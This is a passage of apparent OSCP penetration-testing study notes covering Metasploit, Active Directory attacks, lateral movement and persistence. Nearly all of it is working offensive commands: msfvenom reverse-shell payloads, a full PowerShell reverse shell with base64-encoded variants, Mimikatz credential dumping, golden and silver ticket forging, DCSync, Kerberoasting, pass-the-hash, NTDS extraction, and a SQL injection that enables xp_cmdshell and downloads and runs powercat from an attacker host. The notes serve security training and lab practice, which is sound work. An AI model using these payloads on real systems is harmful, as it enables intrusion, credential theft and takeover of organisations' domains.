need to set our payload before running exploit
```
set payload payload/linux/x64/shell_reverse_tcp
show options
```

can background a shell with ctrl-Z 
interact with a session
```
sessions -i 1
```

to run an exploit in a background session
```
run -j
```

## Metasploit Payloads
### Staged vs Unstaged

show and set payloads
```
show payloads
set payload 15
run
```

unstaged -- all-in-one. exploit and shell code sent together
staged -- first exploit, then send shell

There are several situations in which we would prefer to use a staged payload instead of non-staged. If there are space-limitations in an exploit, a staged payload might be a better choice as it is typically smaller. In addition, we need to keep in mind that antivirus software can detect shellcode in an exploit. By replacing the full code with a first stage, which loads the second and malicious part of the shellcode, the remaining payload is retrieved and injected directly into the victim machine's memory. This may prevent detection and can increase our chances of success.

### Meterpreter payload
meterpreter commands
```
sysinfo
getuid
```

inside of sessions, we can run a new shell
```
shell
```

this opens a new channel, which we can attach /detach
```
channel -l
channel -i 1
```

commands with l prefix act on our local machine, for ex lpwd

```
upload unix-privesc-check
```

search for file 
```
search -f filename
```

### Executable payloads


To get familiar with msfvenom, we'll first create a malicious Windows binary starting a raw TCP reverse shell. Let's begin by listing all payloads with payloads as argument for -l. In addition, we use --platform to specify the platform for the payload and --arch for the architecture.

```
msfvenom -l payloads --platform windows --arch x64 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe
```

then from Windows machine can run
```
iwr -uri http://192.168.119.2/nonstaged.exe -Outfile nonstaged.exe
.\nonstaged.exe
```

note that netcat cannot handle staged payload / meterpreter, have to use `multi/handler` to setup reverse shell
```
use multi/handler
set payload windows/x64/shell/reverse_tcp
show options
set LHOST 192.168.119.2
set LPORT 443
run
```

## Post-Exploitation
### Post-Exploit Commands

idletime shows how long a user has been away for

 Metasploit contains the command getsystem, which attempts to automatically elevate our permissions to NT AUTHORITY\SYSTEM


```
shell
whoami /priv
exit
getuid
getsystem
getuid
```

can also migrate meterpreter execution to a different process

```
ps
migrate 8052
```

We should note that we are only able to migrate into processes that execute at the same (or lower) integrity and privilege level3 than that of our current process.

Instead of migrating to an existing process or a situation in which we won't find any suitable processes to migrate to, we can use the execute Meterpreter command. This command provides the ability to create a new process by specifying a command or program

```
execute -H -f notepad
migrate 2720
```

### Post-Exploit Modules
Sometimes UAC prevents us from performing admin ops remotely.  Need to upgrade integrity level.

Get integrity level
```
shell
powershell -ep bypass
Import-Module NtObjectManager
Get-NtTokenIntegrityLevel
```

can background session and search for modules
```
^Z
bg
search UAC
```

One very effective UAC bypass on modern Windows systems is exploit/windows/local/bypassuac_sdclt, which targets the Microsoft binary sdclt.exe. This binary can be abused to bypass UAC by spawning a process with integrity level High.6

```
use exploit/windows/local/bypassuac_sdclt
show options
set SESSION 9
set LHOST 192.168.119.4
run
```

now recheck our shell
```
shell
powershell -ep bypass
Import-Module NtObjectManager
Get-NtTokenIntegrityLevel
```

we can also load modules directly into existing session

One great example of this is Kiwi, which is a Meterpreter extension providing the capabilities of Mimikatz. Because Mimikatz requires SYSTEM rights, let's exit the current Meterpreter session, start the listener again, execute met.exe as user luiza in the bind shell, and enter getsystem.

```
use exploit/multi/handler
run
getsystem
```

Now, let's enter load with kiwi as argument to load the Kiwi module. Then, we can use help to display the commands of the Kiwi module. Finally, we'll use creds_msv to retrieve LM7 and NTLM8 credentials.

```
load kiwi
help
creds_msv
```

### Pivoting with Metasploit

first check out ip config
```
ipconfig
```

then reverse shell into meterpreter.
Now that we have a working session on the compromised system, we can background it. To add a route to a network reachable through a compromised host, we can use route add with the network information and session ID that the route applies to. After adding the route, we can display the current routes with route print.

```
bg
route add 172.16.5.0/24 12
route print
```

if we wanted to scan whole network, set rhosts to 172.16.5.0/24 12 . but for sake of time using simplified case
```
use auxiliary/scanner/portscan/tcp 
set RHOSTS 172.16.5.200
set PORTS 445,3389
run
```

since we have NTLM creds from previous section, can use psexec module
```
use exploit/windows/smb/psexec 
set SMBUser luiza
set SMBPass "BoccieDearAeroMeow1!"
set RHOSTS 172.16.5.200
set payload windows/x64/meterpreter/bind_tcp
set LPORT 8000
run
```

As an alternative to adding routes manually, we can use the autoroute post-exploitation module to set up pivot routes through an existing Meterpreter session automatically. 

can terminate existing routes with 
```
route flush
```

now use auto route
```
use multi/manage/autoroute
show options
sessions -l
set session 12
run
```

We could now use the psexec module as we did before, but we can also combine routes with the server/socks_proxy auxiliary module to configure a SOCKS2 proxy. This allows applications outside of the Metasploit Framework to tunnel through the pivot on port 1080 by default. We set the option SRVHOST to 127.0.0.1 and VERSION to 5 in order to use SOCKS version 5.
```
use auxiliary/server/socks_proxy 
show options
set SRVHOST 127.0.0.1
set VERSION 5
run -j
```

then update conf file
```
socks5 127.0.0.1 1080
```

finally run the command
```
sudo proxychains xfreerdp /v:172.16.5.200 /u:luiza
```

can also use a similar technique for port forwarding

```
sessions -i 12
portfwd add -l 3389 -p 3389 -r 172.16.5.200
```

can now run command without proxy chains
```
sudo xfreerdp /v:127.0.0.1 /u:luiza
```

### Resource Scripts
can automate tasks with .rc files

example
```
use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_https
set LHOST 192.168.119.4
set LPORT 443

set AutoRunScript post/windows/manage/migrate 
set ExitOnSession false
run -z -j
```

then start console with 
```
sudo msfconsole -r listener.rc
```

can view pre-existing resources
```
ls -l /usr/share/metasploit-framework/scripts/resource
```

useful rev shell for windows payloads
```
cmd/windows/powershell/x64/meterpreter/reverse_tcp
```

## Active Directory
### Manual Enumeration

Windows tools

can get domain info with net
users in domain
```
net user /domain
```

can check out individual user
```
net user jeffadmin /domain
```

can also use net group for groups
```
net group /domain
net group "Sales Department" /domain
```

Powershell and .NET
According to Microsoft's documentation,5 we need a specific LDAP ADsPath in order to communicate with the AD service. The LDAP path's prototype looks like this:
```
LDAP://HostName[:PortNumber][/DistinguishedName]
```

OFten want to find Primary Domain Controller (PDC) for enumeration since it has most info
In the Microsoft .NET classes related to AD,9 we find the `System.DirectoryServices.ActiveDirectory` namespace
```
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

When running in script we need
```
powershell -ep bypass
```

we can extract the Pdc name directly from the above call
```
# Store the domain object in the $domainObj variable
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Store the PdcRoleOwner name to the $PDC variable
$PDC = $domainObj.PdcRoleOwner.Name

# Print the $PDC variable
$PDC
```

but the name object won't be formatted correctly, so we need to use adsi to fix that
```
# Store the domain object in the $domainObj variable
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Store the PdcRoleOwner name to the $PDC variable
$PDC = $domainObj.PdcRoleOwner.Name

# Store the Distinguished Name variable into the $DN variable
$DN = ([adsi]'').distinguishedName

# Print the $DN variable
$DN
```

now we can plug in the rest of the ldap vars
```
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"
$LDAP
```
adding search

DirectorySearcher queries AD via LDAP
get all objects in the domain

```
$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.FindAll()
```

since output is large, we want to filter for samAccountType (users, groups, and computers)
0x30000000 is user sam type
```
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="samAccountType=805306368"
$dirsearcher.FindAll()
```

we also w
```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = $domainObj.PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="samAccountType=805306368"
$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }

    Write-Host "-------------------------------"
}
```

can refactor into function
```
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName

    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")

    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)

    return $DirectorySearcher.FindAll()

}
```

then we can import and use cmd args
```
Import-Module .\function.ps1
LDAPSearch -LDAPQuery "(samAccountType=805306368)"
LDAPSearch -LDAPQuery "(objectclass=group)"
```

can use foreach to get properties
```
foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
    $group.properties | select {$_.cn}, {$_.member}
}
```
can make the filter more restrictive
```
$sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"
$sales.properties.member
$group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Development Department*))"
```
### PowerView

Helpful module for automating the above
```
Import-Module .\PowerView.ps1
```

Domain info
```
Get-NetDomain
```

Get list of all users in domain
```
Get-NetUser | select cn
Get-NetUser | select cn,pwdlastset,lastlogon
```

Get groups
```
Get-NetGroup | select cn
Get-NetGroup "Sales Department" | select member
```

can use Get-NetComputer to enumerate computer objects
```
Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname
```

It's a good idea to grab this information early in the assessment to determine the relative age of the systems and to locate potentially weak targets

Can figure out which computers we have admin access on
```
Find-LocalAdminAccess
```

Can use this to figure out who is logged in to a specific computer
```
Get-NetSession -ComputerName files04 -verbose
```

If that fails, we can try PSLoggedon (needs Remote Registry service active)
```
.\PsLoggedon.exe \\files04
```

Services launched by system run in service account

When applications like Exchange,5 MS SQL, or Internet Information Services (IIS) are integrated into AD, a unique service instance identifier known as Service Principal Name (SPN)6 associates a service to a specific service account in Active Directory.

get spns 
```
setspn -L iis_service
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```
we can nslookup service principal names to try to get ip address
```
nslookup.exe web04.corp.com
```

### Object Permissions
interesting permissions
```
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group
```

get users ACE objects
```
Get-ObjectAcl -Identity stephanie
```

we're looking fr ObjectSID, ActiveDirectoryRights, and SecurityIdentifier

we need to convert these into human readable names
```
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553
```
n short, we are interested in the ActiveDirectoryRights and SecurityIdentifier for each object we enumerate going forward.

GenericAll is the most permissive.  To search for it
```
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights`
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
```

add user to group
```
net group "Management Department" stephanie /add /domain
Get-NetGroup "Management Department" | select member
```

can later delete from group
```
net group "Management Department" stephanie /del /domain
Get-NetGroup "Management Department" | select member
```

### Enumerating Domain Shares
list all shares
```
Find-DomainShare
```

In this instance, we'll first focus on SYSVOL,1 as it may include files and folders that reside on the domain controller itself. This particular share is typically used for various domain policies and scripts. By default, the SYSVOL folder is mapped to %SystemRoot%\SYSVOL\Sysvol\domain-name on the domain controller and every domain user has access to it.

```
ls \\dc1.corp.com\sysvol\corp.com\
ls \\dc1.corp.com\sysvol\corp.com\Policies\
cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
```

can use gpp-decrypt to decrypt AD gpp passwords
```
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```

## Automated Enumeration
### SharpHound

first import it
```
Import-Module .\Sharphound.ps1
```

to start we net to run Invok-Bloodhound
```
Get-Help Invoke-BloodHound
```

Invoke Sharphound -- data in zip files
```
Invoke-BloodHound -CollectionMethod All -OutputPrefix "oscp_audit"
```

### BloodHound

first have to start neo4j graph database
neo4j username/password
```
sudo neo4j start
```

now we run
```
bloodhound
```

can run find domain admin and find shortest path to domain admin

need to mark user as owned

reset neo4j for bloodhound
```
MATCH (n) OPTIONAL MATCH (n)-[r]-() DELETE n,r
```

for changing pw in AD, need full username

```
net user steve@corp.com Password123! /domain
```

### AD Authentication
can use Mimikatz to extract domain hashes

```
privilege::debug
sekurlsa::logonpasswords
```

 For AD instances at a functional level of Windows 2003, NTLM is the only available hashing algorithm. For instances running Windows Server 2008 or later, both NTLM and SHA-1 (a common companion for AES encryption) may be available


A different approach and use of Mimikatz is to exploit Kerberos authentication by abusing TGT and service tickets. 

can use mimikatz to view tickets
```
sekurlsa::tickets
```

### Password Attacks

need to gather threshold before password lockout
```
net accounts
```

can do a slow password spray to enumerate credentials

can also target SMB

We can use crackmapexec4 on Kali to perform this kind of password spraying. We'll select smb as protocol and enter the IP address of any domain joined system such as CLIENT75 (192.168.50.75). 

warning: SMB generates a lot of traffic

```
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```

crackmapexec added Pwn3d! to the output, indicating that dave has administrative privileges on the target system. I

third kind of attack is based on TGT

can use kerbrute for this
```
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```

I you receive a network error, make sure that the encoding of usernames.txt is ANSI. You can use Notepad's Save As functionality to change the encoding.

### AS-REP Roasting
By default, the AD user account option Do not require Kerberos preauthentication is disabled, meaning that Kerberos preauthentication is performed for all users. However, it is possible to enable this account option manually. I

On Kali, we can use impacket-GetNPUsers3 to perform AS-REP roasting. We'll need to enter the IP address of the domain controller as an argument for -dc-ip, the name of the output file in which the AS-REP hash will be stored in Hashcat format for -outputfile, and -request to request the TGT.

```
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
```

The result shows that hows that dave has the user account option Do not require Kerberos preauthentication enabled, meaning it's vulnerable to AS-REP Roasting.

check AS-REP mode in hashcat
```
hashcat --help | grep -i "Kerberos"
```

```
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

can do a similar roasting on windows with rubeus

if we're pre-authenicated we can just do a simple command
```
cd C:\Tools
.\Rubeus.exe asreproast /nowrap
```

to get pre-auth disabled on windows, run PowerView
```
Get-DomainUser -PreauthNotRequired
```

if we have GenericWrite or GenericAll on another use, could disable Kerberos preauth then do AS-REP roasting.

### Kerberoasting

for windows we can use rubeus again
```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
then use hashcat again, this time we want TGS-REP
```
hashcat --help | grep -i "Kerberos"
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

on linux we use impack-GetUserSPNs

```
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

This technique is immensely powerful if the domain contains high-privilege service accounts with weak passwords, which is not uncommon in many organizations. However, if the SPN runs in the context of a computer account, a managed service account,5 or a group-managed service account,6 the password will be randomly generated, complex, and 120 characters long, making cracking infeasible. 

Let's assume that we are performing an assessment and notice that we have GenericWrite or GenericAll permissions7 on another AD user account. As stated before, we could reset the user's password but this may raise suspicion. However, we could also set an SPN for the user,8 kerberoast the account, and crack the password hash in an attack named targeted Kerberoasting. 

### Silver Tickets
Privileged Account Certificate (PAC)1 validation2 is an optional verification process between the SPN application and the domain controller. If this is enabled, the user authenticating to the service and its privileges are validated by the domain controller. Fortunately for this attack technique, service applications rarely perform PAC validation.

In general, we need to collect the following three pieces of information to create a silver ticket:
    SPN password hash
    Domain SID
    Target SPN

Check if we have access to service
```
iwr -UseDefaultCredentials http://web04
```
if service has active session on our machine, use mimikatz to get NTLM hash

now let's get SID of user
```
whoami /user
```

remember for SID to omit last 4 digits if we're interested in domain SID

use kerberos::golden to gernerate ticket
```
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```

use klist to view ticket
```
klist
```

can recheck our creds
```
iwr -UseDefaultCredentials http://web04
```
### Domain Controller Synchronization
To launch synchronization attack, To launch such a replication, a user needs to have the Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set rights. By default, members of the Domain Admins, Enterprise Admins, and Administrators groups have these rights assigned.

can be done via mimikatz or linux
example to get dave password

```
.\mimikatz.exe
lsadump::dcsync /user:corp\dave
```

can use hashcat to crack the hash

from linux we can do the same thing

```
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```

if using impacket-secrets dump, output will look like this
```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:e1cced9c6ef723837ff55e373d971633afb8af8871059f3451ce4bccfcca3d4c
krbtgt:aes128-cts-hmac-sha1-96:8c5cf3a1c6998fa43955fa096c336a69
krbtgt:des-cbc-md5:683bdcba9e7c5de9
[*] Cleaning up...

```

we want the last part after NTDS.DIT secrets, before the three colons -> 1693c6cefafffc7af11ef34d1c788f47

If we don't have RDP access from the start but we do have a login username and password, we can do some roasting to obtain other passwords, then try RDP

## Lateral Movement in AD

### WMI and WinRM
In order to create a process on the remote target via WMI, we need credentials of a member of the Administrators local group, which can also be a domain user.
UAC restrictions do not apply to domain user.

launch a calculator instance example
```
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
```

can launch a reverse shell with base 64 encoding
```
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

in powershell
```
PS C:\Users\jeff> $username = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

PS C:\Users\jeff> $Options = New-CimSessionOption -Protocol DCOM
PS C:\Users\jeff> $Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options

PS C:\Users\jeff> $Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

winRM can be used for remote host management

For WinRS to work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host.

```
winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
```

can also just use the reverse shell from above
```
winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```

powershell also has winRM features
```
PS C:\Users\jeff> $username = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

PS C:\Users\jeff> New-PSSession -ComputerName 192.168.50.73 -Credential $credential
```

To interact with the session ID 1 we created, we can issue the Enter-PSSession cmdlet followed by the session ID.
```
Enter-PSSession 1
```

### PSExec
To begin, the user that authenticates to the target machine needs to be part of the Administrators local group. In addition, the ADMIN$ share must be available and File and Printer Sharing has to be turned on. Luckily for us, the last two requirements are already met as they are the default settings on modern Windows Server systems

can transfer PSExec64.exe to target machine

we can then execute the following
```
./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
```

### Pass the Hash

can use wmiexec to pass NTLM hash (doesn't work for kerberos). Need to pass the hash of local admin

```
/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```

### Overpass the Hash
use NTLM hash to get TGT, then use TGT to get TGS (ticket-granting service)
first need to run process as a different user.
then use mimikatz to get the password hash
afterwards pass that hash to the following

```
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```

now we can run commands as jen

to view cached tickets use
```
net use \\files04
klist
```

now we can run tools like official PSExec without password
```
cd C:\tools\SysinternalsSuite\
.\PsExec.exe \\files04 cmd
```

### Pass the ticket
The Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. In addition, if the service tickets belong to the current user, then no administrative privileges are required.

we'll get access denied if we try to access service without TGS
```
ls \\web04\backup
```

we need to launch mimikatz and export all tickets from other users from memory
```
privilege::debug
sekurlsa::tickets /export
```

verifiy existing tickets with
```
dir *.kirbi
```

we can then inject a ticket into our own session
```
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```

then verify with
```
klist
```

now the following command should work
```
ls \\web04\backup
```
### DCOM
Distributed Computer Object Model

Performed on TCP 135 -- local admin access required

can get a reverse shell with command execution
```
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMwA1ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==","7")
```

## AD Persistence
### Golden ticket
To get TGT, we need to know password hash of krbtgt.  If we have this, we can craft our own tickets

silver ticket -> force TGS for specific service
golden ticket -> entire domain access

as test case, try to access DC
```
PsExec64.exe \\DC1 cmd.exe
```

At this stage of the engagement, the golden ticket will require us to have access to a Domain Admin's group account or to have compromised the domain controller itself in order to work as a persistence method.

```
privilege::debug
lsadump::lsa /patch
```

this will give us SID of domain + NTLM hash of krbtgt

before getting golden ticket, we should purge existing tickets
```
kerberos::purge
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
misc::cmd
```

now we can re-run psexec
```
PsExec.exe \\dc1 cmd.exe
ipconfig
whoami
whoami /groups
```

Note that by creating our own TGT and then using PsExec, we are performing the overpass the hash attack by leveraging Kerberos authentication as we discussed earlier in this Module. If we were to connect PsExec to the IP address of the domain controller instead of the hostname, we would instead force the use of NTLM authentication and access would still be blocked as the next listing shows.

### AD Persistence
A Shadow Copy,1 also known as Volume Shadow Service (VSS) is a Microsoft backup technology that allows creation of snapshots of files or entire volumes.

To manage volume shadow copies, the Microsoft signed binary vshadow.exe2 is offered as part of the Windows SDK.

can use vshadow utility to extract AD database NTDS.dit. then we can extract every user credential offline

first connect to DC as domain admin, then launch
```
vshadow.exe -nw -p  C:
```

we should take note of shadow copy device name from output
```
- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

We'll now copy the whole AD Database from the shadow copy to the C: drive root folder by specifying the shadow copy device name and append the full ntds.dit path.
```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
```

As a last ingredient, to correctly extract the content of ntds.dit, we need to save the SYSTEM hive from the Windows registry. We can accomplish this with the reg utility and the save argument.
```
reg.exe save hklm\system c:\system.bak
```

we then move the two .bak files to our windows machine and crack them
```
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

## Assembling pieces

Use whatweb to get tech stack for webpage
```
whatweb http://192.168.50.244
```

Using wpscan without api key
```
wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan
cat websrv1/wpscan
```

use crackmapexec to pair usernames with passwords
```
crackmapexec smb 192.168.50.242 -u usernames.txt -p passwords.txt --continue-on-success
```

can also use it to get SMB shares
```
crackmapexec smb 192.168.50.242 -u john -p "dqsTwTpZPn#nL" --shares
```

library file attack 
1. starts wsgidav
```
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/offsec/oscp/webdav/
```

use Copy-Item for SMB share command line access
```
Copy-Item -Path C:\file.exe -Destination \\192.168.45.235\share
```

bloodhound get computers and users on network
```
MATCH (m:Computer) RETURN m
MATCH (m:User) RETURN m
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```

## Medtech

sqli
```
'EXECUTE sp_configure 'show advanced options',1;RECONFIGURE;EXECUTE sp_configure 'xp_cmdshell',1;RECONFIGURE;EXECUTE master.dbo.xp_cmdshell 'powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString(\"http://192.168.45.193/powercat.ps1\");powercat -c 192.168.45.193 -p 4444 -e powershell"';--+//
```

.\chisel.exe client 192.168.45.193:8080 R:socks

can use crackmapexec for open smb shares
```
sudo proxychains -q crackmapexec smb 172.16.211.0/24
```
mimikatz
lsadump::secrets 

Useful file command
```
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx, *.kdbx, *.log -File -Recurse -ErrorAction SilentlyContinue
```

Mimikatz one-liner
```
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
```

Powershell one liner with powercat
```
powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.184/powercat.ps1');powercat -c 192.168.45.184 -p 443 -e powershell"
```

ConPty shell windows command
```
